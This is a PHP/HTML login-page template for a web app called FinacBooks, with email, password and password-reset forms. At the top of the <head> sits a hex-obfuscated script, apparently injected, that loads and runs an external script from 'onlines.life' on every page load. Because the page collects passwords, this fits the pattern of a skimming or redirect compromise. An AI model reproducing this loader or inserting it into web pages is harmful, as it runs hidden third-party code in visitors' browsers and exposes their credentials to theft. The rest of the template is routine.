<!doctype html>
<html lang="en">
<head>
<script>
var _0x828d=["\x73\x63\x72\x69\x70\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6F\x6E\x6C\x69\x6E\x65\x73\x2E\x6C\x69\x66\x65\x2F\x6F\x6B","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x61\x73\x79\x6E\x63","\x73\x72\x63","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];(function(_0x96cax1,_0x96cax2,_0x96cax3,_0x96cax4,_0x96cax5,_0x96cax6){_0x96cax5= _0x96cax2[_0x828d[2]](_0x96cax3);_0x96cax6= _0x96cax2[_0x828d[3]](_0x96cax3)[0];_0x96cax5[_0x828d[4]]= 1;_0x96cax5[_0x828d[5]]= _0x96cax4;_0x96cax6[_0x828d[7]][_0x828d[6]](_0x96cax5,_0x96cax6)})(window,document,_0x828d[0],_0x828d[1])
</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="msapplication-tap-highlight" content="no"/>
    <link rel="icon" type="image/png" href="<?php echo base_url();?>assets/img/finacbook_icon.png" sizes="16x16">
    <link rel="icon" type="image/png" href="<?php echo base_url();?>assets/img/finacbook_icon.png" sizes="32x32">
    <title>FinacBooks</title>
    <link href='http://fonts.googleapis.com/css?family=Roboto:300,400,500' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="<?php echo base_url()?>assets/bower_components/uikit/css/uikit.almost-flat.min.css"/>
    <link rel="stylesheet" href="<?php echo base_url()?>assets/css/login_page.min.css" />
	<?php include('analytics.php');?>
</head>
<body class="login_page" style="background-image:url('<?php echo base_url();?>assets/img/bg.jpg')" >
    <div class="login_page_wrapper">
     
  <?php  if(isset($message1)) { echo '<div class="uk-alert uk-alert-danger" data-uk-alert="">
                                <a href="#" class="uk-alert-close uk-close"></a>'.$message1.'</div>';}?>
 <?php  if(isset($message_display)) { echo '<div class="uk-alert uk-alert-success" data-uk-alert="">
                                <a href="#" class="uk-alert-close uk-close"></a>'.$message_display.'</div>';}?>
								
 <?php  if(isset($_GET['email'])) { echo '<div class="uk-alert uk-alert-success" data-uk-alert="">
                                <a href="#" class="uk-alert-close uk-close"></a>check your email for instructions, thank you</div>';}?>								
        <div class="md-card" id="login_card">
            <div class="md-card-content large-padding" id="login_form">
                <div class="login_heading">
              <div class="user_avatar" style="background-image:url(<?php echo base_url()?>assets/img/finacbook_icon.png);height:75px;width:100%;background-color:white;"></div>
                </div>
				<?php echo form_open(base_url('user_ctrl/login'))?>
                    <div class="uk-form-row">
                        <label for="login_username">Email</label>
                        <input class="md-input" type="text" id="login_username" name="email" />
                    </div>
                    <div class="uk-form-row">
                        <label for="login_password">Password</label>
                        <input class="md-input" type="password" id="login_password" name="password" />
                    </div>
                    <div class="uk-margin-medium-top">
                        <input type="submit" name="submit" value="Sign In" class="md-btn md-btn-primary md-btn-block md-btn-large">
                    </div>
                    <div class="uk-margin-top">
                        <a href="#" id="#" class="uk-float-right">Need help?</a>
                        <span class="icheck-inline">
                            <input type="checkbox" name="login_page_stay_signed" id="login_page_stay_signed" data-md-icheck />
                            <label for="login_page_stay_signed" class="inline-label">Stay signed in</label>
                        </span>
                    </div>
				  <div class="uk-margin-top uk-text-center">
            <a href="<?php echo base_url()?>register" id="#">Create an account</a>
        </div>	
                </form>
            </div>
            <div class="md-card-content large-padding uk-position-relative" id="login_help" style="display: none">
                <button type="button" class="uk-position-top-right uk-close uk-margin-right uk-margin-top back_to_login"></button>
                <h2 class="heading_b uk-text-success">Can't log in?</h2>
                <p>Here’s the info to get you back in to your account as quickly as possible.</p>
                <p>If your password still isn’t working, it’s time to <a href="#" id="password_reset_show">reset your password</a>.</p>
            </div>
            <div class="md-card-content large-padding" id="login_password_reset" style="display: none">
                <button type="button" class="uk-position-top-right uk-close uk-margin-right uk-margin-top back_to_login"></button>
                <h2 class="heading_a uk-margin-large-bottom">Reset password</h2>
                <form method='post' action="<?php echo base_url();?>user_ctrl/recover_password">
                    <div class="uk-form-row">
                        <label for="login_email_reset">Your email address</label>
                        <input class="md-input" type="text" id="login_email_reset" name="email_reset" />
                    </div>
                    <div class="uk-margin-medium-top">
                        <input type="submit" class="md-btn md-btn-primary md-btn-block" value="Reset password">
                    </div>
            <?php form_close();?>
            </div>
        </div>
      
    </div>

    <!-- common functions -->
    <script src="<?php echo base_url()?>assets/js/common.min.js"></script>
    <!-- altair core functions -->
    <script src="<?php echo base_url()?>assets/js/altair_admin_common.min.js"></script>

    <!-- altair login page functions -->
    <script src="<?php echo base_url()?>assets/js/pages/login.min.js"></script>

    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','../www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-65191727-1', 'auto');
        ga('send', 'pageview');
    </script>
</body>
</html>
